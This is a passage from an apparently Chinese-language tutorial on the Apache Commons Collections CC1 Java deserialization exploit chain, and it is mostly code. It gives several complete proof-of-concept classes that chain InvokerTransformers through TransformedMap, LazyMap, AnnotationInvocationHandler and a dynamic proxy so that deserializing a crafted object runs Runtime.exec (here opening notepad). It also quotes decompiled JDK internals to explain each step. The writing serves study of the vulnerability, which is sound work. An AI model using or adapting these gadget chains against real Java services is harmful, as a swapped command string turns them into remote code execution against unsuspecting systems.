class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//payload</span></span><br><span class="line">        Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(x);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, d);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，当作网络传输</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(map1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(f1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> (Map) f2.readObject();</span><br><span class="line">        map2.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时便可以顺利弹出记事本了</p><h5 id="3-2-1-2-AnnotationInvocationHandler的readObject复写点"><a href="#3-2-1-2-AnnotationInvocationHandler的readObject复写点" class="headerlink" title="3.2.1.2.AnnotationInvocationHandler的readObject复写点"></a>3.2.<strong>1.2.AnnotationInvocationHandler的readObject复写点</strong></h5><p>追求完美，要让它只执行一个readObject就弹出记事本，看看AnnotationInvocationHandler类下的readObject函数，发现在里面有赋值操作var5.setValue，不管它值是什么，总之只要赋值就能执行我们的命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   var1.defaultReadObject();</span><br><span class="line">   <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">   <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">       <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">       <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">       <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">       <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">           <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">               var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改下代码，由于AnnotationInvocationHandler类的构造函数的第一个参数继承Annotation，所以第一个变量可以在该包底选一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//payload</span></span><br><span class="line">        Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(x);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, d);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ct</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ct.newInstance(Documented.class, map1);</span><br><span class="line">        <span class="comment">//payload序列化写入文件，当作网络传输</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(f1);</span><br><span class="line"></span><br><span class="line">        f2.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于var3里面有一组Map数据，会把用户输入的Map数据的每一组key值在其var3寻找，有则不为空，进入判断则可执行。</p><p><img src="1663585334940-c2916eb1-ee5d-44ac-8515-b185305d8edb.png" alt="img"></p><h4 id="3-2-2-LazyMap"><a href="#3-2-2-LazyMap" class="headerlink" title="3.2.2.LazyMap"></a>3.2.2.LazyMap</h4><p>有两种方法，一种是直接利用lazymap类进行修改，另一种是利用动态代理</p><h5 id="3-2-2-1-基础版"><a href="#3-2-2-1-基础版" class="headerlink" title="3.2.2.1.基础版"></a>3.2.2.1.基础版</h5><p>LazyMap类，发现其get函数在获取key所对应的数据时，如果当key不存在，则调用transform函数，并把执行结果作为该key所对应的数据，并添加到到Map里面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload</span></span><br><span class="line">        Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(x);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> LazyMap.decorate(map, d);</span><br><span class="line">        map1.get(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可顺利弹出记事本</p><h5 id="3-2-2-2-动态代理"><a href="#3-2-2-2-动态代理" class="headerlink" title="3.2.2.2.动态代理"></a>3.2.<strong>2.2.动态代理</strong></h5><p>运行一段代码，程序执行了invoke方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">expHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">expHandler</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;put&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook Method: &quot;</span> + method.getName());</span><br><span class="line">            map.put(<span class="string">&quot;hi&quot;</span>, <span class="string">&quot;xd&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">expHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;hi&quot;</span>, <span class="string">&quot;sir&quot;</span>);</span><br><span class="line">        System.out.println(proxyMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现输出的结果是先去执行invoke，当匹配不到，则按正常执行。</p><p>AnnotationInvocationHandler类其实和InvocationHandler差不多里都有invoke，AnnotationInvocationHandler类下的invoke里面使用的get函数，所以从这里切入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">var7</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span>(var4.hashCode()) &#123;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1776922004</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">147696667</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1444986633</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这些，我们修改代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//payload</span></span><br><span class="line">        Transformer[] x = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;notepad&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(x);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> LazyMap.decorate(map, d);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ct</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) ct.newInstance(Target.class, map1);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ct.newInstance(Target.class, proxyMap);  <span class="comment">//这样写也可handler = (InvocationHandler) ct.newInstance(Retention.class, proxyMap);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，当作网络传输</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span 